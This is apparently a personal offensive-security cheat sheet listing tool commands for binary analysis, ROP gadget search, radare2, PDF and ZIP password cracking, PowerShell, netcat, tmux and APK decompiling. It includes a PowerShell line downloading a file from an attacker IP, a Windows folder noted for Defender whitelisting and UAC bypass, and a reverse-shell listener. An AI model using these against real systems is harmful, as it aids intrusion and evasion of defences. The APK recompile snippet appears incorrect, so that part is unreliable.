# Exploit dev
Show binary protections:  
```
$ rabin2 -I <binary>
$ checksec -f <binary>
```

List imported functions:  
```
$ rabin2 -i <binary>
```

List functions written by the programmer (approx.):  
```
$ rabin2 -qs <binary> | grep -ve imp -e ' 0 '
```

List symbols: (a = inlcude debug symbols, n = sort by address [numeric])
```
$ nm -a -n <binary>
```

Strings:  
```
$ rabin2 -z <binary>
```

ROP gadgets:
```
$ python3 Ropper.py -f <file(s)>
      --all
      --search 'inc eax'
      --jmp eax
      --badbytes 000a0d
      --console
      --help
```

## Radare2
| Function                  | Command |
| ---                       | --- |
| Open file                 | ```$ r2 <binary>``` |
| Help                      | ```> ?``` |
| Quit                      | ```> q``` |
| Analyse all               | ```> aa``` |
| List functions            | ```> afl``` |
| Disassemble function      | ```> pdf [@ <function name>]``` |

# Python

## Host webserver in current directory
```python3 -m http.server```  
```python2 -m SimpleHTTPServer```

# PDF files
## Tools
https://blog.didierstevens.com/programs/pdf-tools/

## Crack
Download Bleeding John (https://github.com/magnumripper/JohnTheRipper). Use pdf2john.pl.
```Kali
$ perl pdf2john.pl file.pdf > pdf-hash.txt
$ john --wordlist=/w/rockyou.txt pdf-hash.txt
```

# PIL
## 
```python
from PIL import Image
img = Image.open("image.png")
pixels = list(img.getdata())
```

# ZIP files
## Crack
```Kali
$ fcrackzip -u -D -p '/w/rockyou.txt' -v file.zip
```

# Windows

## World-write/readable Directory, Windows Defender whitelist, and on UAC bypass list
```C:\Windows\System32\spool\drivers\color\```

## Powershell

### Is Poserwhell running in Constrained language mode?
```$ExecutionContext.SessionState.LanguageMode```

### Download file over HTTP (works in CLM)
```PS C:\> Invoke-WebRequest -uri http://<attacker ip>/<file> -o <output filename> ```
```PS C:\> iwr -uri http://<attacker ip>/<file> -o <output filename> ```

# PostSploit

## Arrow-support for nc
```rlwrap nc -nvlp 4444```

# Tmux
| Action            | Command |
|---                |---|
| New tmux          | ```tmux new -s ...``` |
| List tmuxs        | ```tmux ls``` |
| Attach to tmux    | ```tmux a -t ...``` |
| Detatch from tmux | ```Ctrl+b d``` |
| Scroll mode       | ```Ctrl+b [``` |
| Exit scroll mode  | ```q``` |

# Android
## Decompile APK
```apktool d package.apk```

## Recompile APK
```
apktool d package/
mv package/dist/package.apk .
```
